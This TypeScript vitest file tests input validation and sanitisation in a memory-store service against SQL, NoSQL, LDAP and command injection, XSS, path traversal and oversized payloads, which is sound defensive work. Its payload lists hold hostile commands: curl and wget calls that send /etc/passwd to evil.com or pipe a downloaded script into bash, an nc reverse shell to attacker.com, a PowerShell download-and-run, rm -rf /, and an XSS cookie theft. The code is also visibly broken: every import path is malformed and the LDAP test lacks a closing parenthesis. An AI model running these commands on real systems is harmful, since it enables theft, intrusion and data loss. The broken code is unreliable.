/**
 * Input Validation Security Tests
 *
 * Comprehensive security testing for input validation vulnerabilities including:
 * - Injection attacks (SQL, NoSQL, Command injection)
 * - Buffer overflow and payload size limits
 * - Data type validation bypasses
 * - Encoding and unicode attacks
 * - Schema validation security
 * - Boundary condition testing
 * - Malformed input handling
 * - Content-type attacks
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import {
  validateMemoryStoreInput,
  validateMemoryFindInput,
  ValidationError
} from ' '../../src/schemas/mcp-inputs.js';
import { sanitizeQuery, type SanitizationLevel } from ' '../../src/utils/query-sanitizer.js';
import { memoryStore } from ' '../../src/services/memory-store.js';
import { smartMemoryFind } from ' '../../src/services/smart-find.js';

describe('Input Validation Security Tests', () => {

  describe('SQL Injection Prevention', () => {
    it('should block SQL injection in memory_store items', async () => {
      const maliciousInputs = [
        // Classic SQL injection patterns
        "'; DROP TABLE knowledge_entity; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO knowledge_entity VALUES ('hack'); --",
        "' OR 1=1 #",
        "' OR 'a'='a",
        "'; EXEC xp_cmdshell('dir'); --",
        "' UNION SELECT schema_name FROM information_schema.schemata --",

        // Advanced SQL injection
        "'; WAITFOR DELAY '00:00:05' --",
        "' AND (SELECT COUNT(*) FROM knowledge_entity) > 0 --",
        "'; ALTER TABLE knowledge_entity DROP COLUMN data; --",
        "' OR EXISTS(SELECT * FROM knowledge_entity WHERE title LIKE '%admin%') --",

        // Time-based SQL injection
        "'; SELECT pg_sleep(10) --",
        "' AND 1=(SELECT COUNT(*) FROM tabname); --",

        // Stacked queries
        "'; SELECT * FROM knowledge_entity; DROP TABLE audit_log; --",

        // Error-based injection
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
      ];

      for (const maliciousInput of maliciousInputs) {
        const maliciousItem = {
          items: [{
            kind: 'entity' as const,
            scope: { project: 'test-project' },
            data: {
              name: maliciousInput,
              entity_type: 'test',
              description: maliciousInput
            }
          }]
        };

        // Should either throw validation error or safely sanitize
        try {
          const result = await memoryStore(maliciousItem.items);
          // If it doesn't throw, ensure no SQL commands were executed
          expect(result.stored).toHaveLength(0);
          expect(result.errors.length).toBeGreaterThan(0);
        } catch (error) {
          // Expected behavior - validation should catch this
          expect(error).toBeInstanceOf(Error);
        }
      }
    });

    it('should sanitize SQL injection in memory_find queries', async () => {
      const maliciousQueries = [
        "'; DROP TABLE knowledge_entity; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; EXEC xp_cmdshell('dir'); --",
        "' OR 1=1 #",
        "' AND (SELECT COUNT(*) FROM knowledge_entity) > 0 --",
        "'; WAITFOR DELAY '00:00:05' --",
      ];

      for (const maliciousQuery of maliciousQueries) {
        const result = sanitizeQuery(maliciousQuery, 'aggressive');

        // Should remove or neutralize SQL syntax
        expect(result.cleaned).not.toContain("DROP TABLE");
        expect(result.cleaned).not.toContain("UNION SELECT");
        expect(result.cleaned).not.toContain("EXEC");
        expect(result.cleaned).not.toContain("WAITFOR");
        expect(result.cleaned).not.toContain("pg_sleep");
        expect(result.cleaned).not.toContain(";");
        expect(result.cleaned).not.toContain("--");
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should block command injection in all inputs', async () => {
      const commandInjectionPayloads = [
        // Unix/Linux commands
        '; ls -la',
        '; cat /etc/passwd',
        '; rm -rf /',
        '; curl http://evil.com/steal-data?data=$(cat /etc/passwd)',
        '; wget http://evil.com/malware.sh -O- | bash',
        '; nc -e /bin/sh attacker.com 4444',
        '; python -c "import os; os.system(\'rm -rf /\')"',

        // Windows commands
        '& dir',
        '& type c:\\windows\\system32\\drivers\\etc\\hosts',
        '& del /f /s /q c:\\*.*',
        '& powershell -command "Invoke-Expression (New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')"',
        '& cmd.exe /c calc',

        // Cross-platform
        '| whoami',
        '&& id',
        '|| echo "vulnerable"',
        '`uname -a`',
        '$(id)',

        // Base64 encoded commands
        '; echo "Y2F0IC9ldGMvcGFzc3dk"|base64 -d|bash',
        '; powershell -enc "Y2F0IGM6XFx3aW5kb3dzXFxzeXN0ZW0zMlxkcnJpdmVyc1xcZXRjXFxob3N0cw=="',
      ];

      for (const payload of commandInjectionPayloads) {
        const maliciousItem = {
          items: [{
            kind: 'entity' as const,
            scope: { project: 'test-project' },
            data: {
              name: payload,
              entity_type: 'test',
              command: payload
            }
          }]
        };

        // Should prevent command execution
        try {
          const result = await memoryStore(maliciousItem.items);
          // If stored, ensure no command syntax remains
          if (result.stored.length > 0) {
            const storedData = JSON.stringify(result.stored);
            expect(storedData).not.toContain('&&');
            expect(storedData).not.toContain('||');
            expect(storedData).not.toContain('|');
            expect(storedData).not.toContain('`');
            expect(storedData).not.toContain('$(');
            expect(storedData).not.toContain('powershell');
            expect(storedData).not.toContain('cmd.exe');
          }
        } catch (error) {
          // Validation should catch this
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('Buffer Overflow and Size Limit Testing', () => {
    it('should enforce payload size limits', async () => {
      // Create oversized payloads
      const largeString = 'A'.repeat(10 * 1024 * 1024); // 10MB
      const hugeArray = new Array(100000).fill('large data');

      const oversizedPayloads = [
        {
          items: [{
            kind: 'entity' as const,
            scope: { project: 'test-project' },
            data: {
              name: largeString,
              entity_type: 'test',
              huge_field: largeString.repeat(100)
            }
          }]
        },
        {
          items: [{
            kind: 'section' as const,
            scope: { project: 'test-project' },
            data: {
              title: 'Test',
              body_md: largeString.repeat(1000)
            }
          }]
        },
        {
          items: hugeArray.map((_, i) => ({
            kind: 'entity' as const,
            scope: { project: 'test-project' },
            data: {
              name: `Entity ${i}`,
              entity_type: 'test',
              data: 'A'.repeat(10000)
            }
          }))
        }
      ];

      for (const payload of oversizedPayloads) {
        try {
          const result = await memoryStore(payload.items);
          // Should either be rejected or handled gracefully
          expect(result.errors.length).toBeGreaterThan(0);
        } catch (error) {
          // Expected for oversized payloads
          expect(error).toBeInstanceOf(Error);
        }
      }
    });

    it('should handle extremely long queries', async () => {
      const longQueries = [
        'A'.repeat(1000000), // 1MB query
        'search '.repeat(100000), // Long repeated query
        'test ' + 'very '.repeat(50000) + 'long query', // Long spaced query
      ];

      for (const longQuery of longQueries) {
        const sanitized = sanitizeQuery(longQuery, 'aggressive');
        // Should truncate or handle gracefully
        expect(sanitized.cleaned.length).toBeLessThan(10000);
      }
    });
  });

  describe('Data Type Validation Bypasses', () => {
    it('should prevent type confusion attacks', () => {
      const maliciousInputs = [
        // Null byte injection
        { items: [{ kind: 'entity\0', scope: { project: 'test' }, data: {} }] },
        { items: [{ kind: 'entity', scope: { project: 'test\0' }, data: {} }] },

        // Type casting attempts
        { items: [{ kind: 123, scope: { project: 'test' }, data: {} }] },
        { items: [{ kind: 'entity', scope: { project: [] }, data: {} }] },
        { items: [{ kind: 'entity', scope: { project: 'test' }, data: 'not an object' }] },

        // Prototype pollution attempts
        { items: [{ kind: 'entity', scope: { project: 'test', '__proto__': { admin: true } }, data: {} }] },
        { items: [{ kind: 'entity', scope: { project: 'test' }, data: { '__proto__': { admin: true } } }] },
        { items: [{ kind: 'entity', scope: { project: 'test' }, data: { 'constructor': { prototype: { admin: true } } } }] },

        // Array/object confusion
        { items: 'not an array' },
        { items: null },
        { items: undefined },
        { items: [null, undefined, 123, 'string'] },
      ];

      for (const maliciousInput of maliciousInputs) {
        expect(() => validateMemoryStoreInput(maliciousInput)).toThrow();
      }
    });

    it('should validate enum values strictly', () => {
      const invalidKinds = [
        'INVALID_KIND',
        'Entity', // Case sensitive
        'entity ', // Trailing space
        ' entity', // Leading space
        'ent\0ity', // Null byte
        '', // Empty string
        123, // Number
        null, // Null
        undefined, // Undefined
        ['entity'], // Array
        { kind: 'entity' }, // Object
      ];

      for (const invalidKind of invalidKinds) {
        const maliciousInput = {
          items: [{
            kind: invalidKind,
            scope: { project: 'test-project' },
            data: {}
          }]
        };

        expect(() => validateMemoryStoreInput(maliciousInput)).toThrow();
      }
    });
  });

  describe('Unicode and Encoding Attacks', () => {
    it('should handle Unicode normalization attacks', () => {
      const unicodeAttacks = [
        // Homoglyph attacks
        'ｅｎｔｉｔｙ', // Full-width characters
        'еntіtу', // Cyrillic characters
        '𝔢𝔫𝔱𝔦𝔱𝔶', // Mathematical script
        '𝖊𝖓𝖙𝖎𝖙𝖞', // Mathematical bold

        // Invisible characters
        'entity\u200b', // Zero-width space
        'entity\u200c', // Zero-width non-joiner
        'entity\u200d', // Zero-width joiner
        'entity\ufeff', // Zero-width no-break space
        'entity\u2060', // Word joiner

        // Overlong encodings
        'entity%C0%80', // Overlong NUL
        'entity%E0%80%80', // Another overlong encoding

        // UTF-7/UTF-8 confusion
        '+ADw-entity+AD4-', // UTF-7 encoded
        '\ufffdentity', // Replacement character
      ];

      for (const attack of unicodeAttacks) {
        const maliciousInput = {
          items: [{
            kind: attack,
            scope: { project: 'test-project' },
            data: {}
          }]
        };

        // Should reject invalid unicode patterns
        expect(() => validateMemoryStoreInput(maliciousInput)).toThrow();
      }
    });

    it('should normalize Unicode strings safely', () => {
      const maliciousQueries = [
        'ｅｎｔｉｔｙ search', // Full-width
        'se\u200barch', // Zero-width space
        'search\u200cterms', // Zero-width non-joiner
        'naïve\u0301 search', // Combining characters
        'café search', // Accented characters
      ];

      for (const query of maliciousQueries) {
        const sanitized = sanitizeQuery(query, 'moderate');
        // Should normalize or remove problematic unicode
        expect(sanitized.cleaned.length).toBeGreaterThan(0);
        expect(sanitized.cleaned).not.toContain('\u200b');
        expect(sanitized.cleaned).not.toContain('\u200c');
        expect(sanitized.cleaned).not.toContain('\u200d');
      }
    });
  });

  describe('XSS and Script Injection Prevention', () => {
    it('should sanitize script injection in data fields', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '<select onfocus=alert("XSS") autofocus>',
        '<textarea onfocus=alert("XSS") autofocus>',
        '<keygen onfocus=alert("XSS") autofocus>',
        '<video><source onerror="alert(\'XSS\')">',
        '<details open ontoggle=alert("XSS")>',
        '<marquee onstart=alert("XSS")>',
        '" onmouseover="alert(\'XSS\')"',
        "' onmouseover='alert(\"XSS\")'",
        '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
        '<meta http-equiv="refresh" content="0;url=http://evil.com/">',
      ];

      for (const xssPayload of xssPayloads) {
        const maliciousItem = {
          items: [{
            kind: 'entity' as const,
            scope: { project: 'test-project' },
            data: {
              name: xssPayload,
              entity_type: 'test',
              description: xssPayload,
              html_content: xssPayload
            }
          }]
        };

        // Should either reject or safely store (escaped)
        try {
          const result = await memoryStore(maliciousItem.items);
          if (result.stored.length > 0) {
            // If stored, data should be safe
            const storedData = JSON.stringify(result.stored);
            expect(storedData).not.toContain('<script>');
            expect(storedData).not.toContain('javascript:');
            expect(storedData).not.toContain('onerror=');
            expect(storedData).not.toContain('onload=');
            expect(storedData).not.toContain('onmouseover=');
          }
        } catch (error) {
          // Validation rejection is acceptable
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should prevent path traversal in file-related operations', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        '....//....//....//etc/passwd',
        '..%2f..%2f..%2fetc%2fpasswd',
        '..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam',
        '/var/www/../../etc/passwd',
        'file:///etc/passwd',
        '../config/database.yml',
        '../../.env',
      ];

      for (const pathPayload of pathTraversalPayloads) {
        const maliciousItem = {
          items: [{
            kind: 'entity' as const,
            scope: { project: 'test-project' },
            data: {
              name: 'test entity',
              entity_type: 'file',
              file_path: pathPayload,
              config_file: pathPayload
            }
          }]
        };

        // Should prevent path traversal
        try {
          const result = await memoryStore(maliciousItem.items);
          if (result.stored.length > 0) {
            const storedData = JSON.stringify(result.stored);
            // Stored paths should be normalized and safe
            expect(storedData).not.toContain('../');
            expect(storedData).not.toContain('..\\');
            expect(storedData).not.toContain('/etc/passwd');
            expect(storedData).not.toContain('Windows\\System32');
          }
        } catch (error) {
          // Rejection is preferred
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('NoSQL Injection Prevention', () => {
    it('should prevent NoSQL injection in query parameters', async () => {
      const nosqlPayloads = [
        { '$ne': null },
        { '$gt': '' },
        { '$regex': '.*' },
        { '$where': 'return true' },
        { '$or': [{ name: { $ne: null } }] },
        { '$and': [{ 'data.name': { $exists: true } }] },
        { '$expr': { $eq: ['$name', '$name'] } },
        { '$jsonSchema': { bsonType: 'object' } },
        { '$mod': [2, 0] },
        { '$text': { $search: 'admin' } },
      ];

      for (const nosqlPayload of nosqlPayloads) {
        const maliciousQuery = JSON.stringify(nosqlPayload);
        const sanitized = sanitizeQuery(maliciousQuery, 'aggressive');

        // Should remove or escape NoSQL operators
        expect(sanitized.cleaned).not.toContain('$ne');
        expect(sanitized.cleaned).not.toContain('$gt');
        expect(sanitized.cleaned).not.toContain('$regex');
        expect(sanitized.cleaned).not.toContain('$where');
        expect(sanitized.cleaned).not.toContain('$or');
        expect(sanitized.cleaned).not.toContain('$and');
        expect(sanitized.cleaned).not.toContain('$expr');
      }
    });
  });

  describe('LDAP Injection Prevention', () => {
    it('should prevent LDAP injection in search parameters', () => {
      const ldapPayloads = [
        '*)(uid=*',
        '*)(|(objectClass=*)',
        '*))(|(uid=*',
        '*)(|(password=*',
        '*)(cn=*',
        '*)(objectClass=*)',
        '*))%00',
        'admin)(&(objectClass=*)',
        '*)(|(objectClass=group)(cn=admin*',
      ];

      for (const ldapPayload of ldapPayloads) {
        const sanitized = sanitizeQuery(ldapPayload, 'aggressive');

        // Should remove LDAP special characters
        expect(sanitized.cleaned).not.toContain('*)');
        expect(sanitized.cleaned).not.toContain('*)*');
        expect(sanitized.cleaned).not.toContain('*)|');
        expect(sanitized.cleaned).not.toContain('*)(');
      }
    }
  });

  describe('HTTP Parameter Pollution', () => {
    it('should prevent HTTP parameter pollution attacks', () => {
      const pollutionPayloads = [
        'test=1&test=2',
        'query=admin&query=user',
        'name=valid&name=malicious',
        'id=123&id=456&id=789',
      ];

      for (const payload of pollutionPayloads) {
        const sanitized = sanitizeQuery(payload, 'moderate');

        // Should handle duplicate parameters safely
        const paramCount = (sanitized.cleaned.match(/=/g) || []).length;
        expect(paramCount).toBeLessThanOrEqual(1);
      }
    });
  });

  describe('Content-Type and MIME Attacks', () => {
    it('should validate content-type safety', async () => {
      const maliciousContentTypes = [
        'application/javascript',
        'text/html',
        'application/x-php',
        'application/x-sh',
        'application/x-python',
        'application/x-executable',
        'application/octet-stream',
        'multipart/form-data; boundary=----WebKitFormBoundary',
        'application/json; charset=utf-8\r\n\r\n<script>alert("XSS")</script>',
      ];

      for (const contentType of maliciousContentTypes) {
        const maliciousItem = {
          items: [{
            kind: 'entity' as const,
            scope: { project: 'test-project' },
            data: {
              name: 'test entity',
              entity_type: 'file',
              content_type: contentType,
              mime_type: contentType
            }
          }]
        };

        // Should handle dangerous content types safely
        try {
          const result = await memoryStore(maliciousItem.items);
          if (result.stored.length > 0) {
            const storedData = JSON.stringify(result.stored);
            // Dangerous content types should be neutralized
            expect(storedData).not.toContain('application/javascript');
            expect(storedData).not.toContain('text/html');
            expect(storedData).not.toContain('application/x-php');
            expect(storedData).not.toContain('<script>');
          }
        } catch (error) {
          // Rejection is acceptable
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('Rate Limiting and Resource Exhaustion', () => {
    it('should handle rapid consecutive requests', async () => {
      const maliciousItem = {
        items: [{
          kind: 'entity' as const,
          scope: { project: 'test-project' },
          data: {
            name: 'test entity',
            entity_type: 'test'
          }
        }]
      };

      // Attempt rapid requests
      const promises = Array.from({ length: 1000 }, () =>
        memoryStore(maliciousItem.items).catch(e => e)
      );

      const results = await Promise.all(promises);

      // Should handle high volume gracefully
      const errors = results.filter(r => r instanceof Error || r.errors?.length > 0);
      expect(errors.length).toBeGreaterThan(0);
    });

    it('should limit concurrent operations', async () => {
      const largePayload = {
        items: Array.from({ length: 1000 }, (_, i) => ({
          kind: 'entity' as const,
          scope: { project: 'test-project' },
          data: {
            name: `Entity ${i}`,
            entity_type: 'test',
            data: 'x'.repeat(1000)
          }
        }))
      };

      try {
        const result = await memoryStore(largePayload.items);
        // Should handle large batches without memory issues
        expect(result.errors.length).toBeGreaterThan(0);
      } catch (error) {
        // Should reject oversized requests
        expect(error).toBeInstanceOf(Error);
      }
    });
  });

  describe('Input Validation Edge Cases', () => {
    it('should handle extreme boundary values', () => {
      const boundaryCases = [
        { query: '', expected: 'reject' },
        { query: ' ', expected: 'reject' },
        { query: '\n', expected: 'reject' },
        { query: '\t', expected: 'reject' },
        { query: '\r\n', expected: 'reject' },
        { query: 'a'.repeat(1000), expected: 'accept' },
        { query: 'a'.repeat(1001), expected: 'reject' },
        { query: null, expected: 'reject' },
        { query: undefined, expected: 'reject' },
        { query: 0, expected: 'reject' },
        { query: false, expected: 'reject' },
        { query: [], expected: 'reject' },
        { query: {}, expected: 'reject' },
      ];

      for (const testCase of boundaryCases) {
        const input = { query: testCase.query };

        if (testCase.expected === 'reject') {
          expect(() => validateMemoryFindInput(input)).toThrow();
        } else {
          expect(() => validateMemoryFindInput(input)).not.toThrow();
        }
      }
    });

    it('should handle deeply nested objects', async () => {
      const createDeepObject = (depth: number): any => {
        if (depth === 0) return 'deep value';
        return { nested: createDeepObject(depth - 1) };
      };

      const deepObject = createDeepObject(1000);

      const maliciousItem = {
        items: [{
          kind: 'entity' as const,
          scope: { project: 'test-project' },
          data: {
            name: 'test entity',
            entity_type: 'test',
            deep_data: deepObject
          }
        }]
      };

      // Should handle or reject deep objects safely
      try {
        const result = await memoryStore(maliciousItem.items);
        // If processed, should be limited in depth
        if (result.stored.length > 0) {
          const storedData = JSON.stringify(result.stored);
          expect(storedData.length).toBeLessThan(1000000); // 1MB limit
        }
      } catch (error) {
        // Rejection is acceptable for overly deep objects
        expect(error).toBeInstanceOf(Error);
      }
    });
  });

  describe('Memory Exhaustion Prevention', () => {
    it('should prevent memory exhaustion through large payloads', async () => {
      const memoryBomb = {
        items: [{
          kind: 'entity' as const,
          scope: { project: 'test-project' },
          data: {
            name: 'A'.repeat(1000000), // 1MB string
            entity_type: 'test',
            large_array: new Array(100000).fill('x'.repeat(1000)),
            large_object: Object.fromEntries(
              Array.from({ length: 10000 }, (_, i) => [`key${i}`, 'value'.repeat(100)])
            )
          }
        }]
      };

      try {
        const result = await memoryStore(memoryBomb.items);
        // Should be rejected or processed with limits
        expect(result.errors.length).toBeGreaterThan(0);
      } catch (error) {
        // Expected for memory bomb payloads
        expect(error).toBeInstanceOf(Error);
      }
    });
  });
});